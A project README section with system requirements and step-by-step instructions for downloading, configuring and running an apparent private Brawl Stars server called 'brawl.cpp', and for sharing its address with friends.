## 📋 System Requirements

Before downloading, ensure your system meets these requirements:

- **Operating System:** Windows 10 or later, Linux
- **RAM:** Minimum 4 GB, recommended 8 GB
- **Processor:** Intel i3 or equivalent
- **Storage:** At least 1 GB of free disk space

## 🛠️ Installation Steps

1. **Download the Application**
   - Go to the [Releases page](https://github.com/Sigma1029/brawl.cpp/releases).
   - Select the latest version from the list.
   - Click on the download link for your operating system.

2. **Extract the Files**
   - Locate the downloaded file in your Downloads folder.
   - Right-click on the file and choose "Extract All".
   - Follow the prompts to extract the files. Choose a location you will remember.

3. **Run the Server**
   - Open the folder where you extracted the files.
   - Look for a file named `start_server.exe` or similar.
   - Double-click the file to start the server.

## 🔧 Configuring the Server

Once the server is running, you can customize it. Here are some simple steps to set it up:

1. **Open the Configuration File**
   - Find a file named `config.json` in the extracted folder.
   - Open it with a text editor like Notepad.

2. **Edit Settings**
   - Change the server name, port number, and other settings to your liking.
   - Save the file after making changes.

3. **Restart the Server**
   - Stop the server by closing it.
   - Run `start_server.exe` again for the changes to take effect.

## 🎮 Connecting to the Server

To join your server or share it with friends, follow these steps:

1. **Get Your IP Address**
   - Open the Command Prompt and type `ipconfig`.
   - Locate your local IP address (usually starts with 192.168.x.x).

2. **Share the IP**
   - Give your friends your IP address along with the port number you set in the configuration file.

3. **Joining the Server**
   - Players can connect to your server using the IP address and port in the Brawl Stars game.
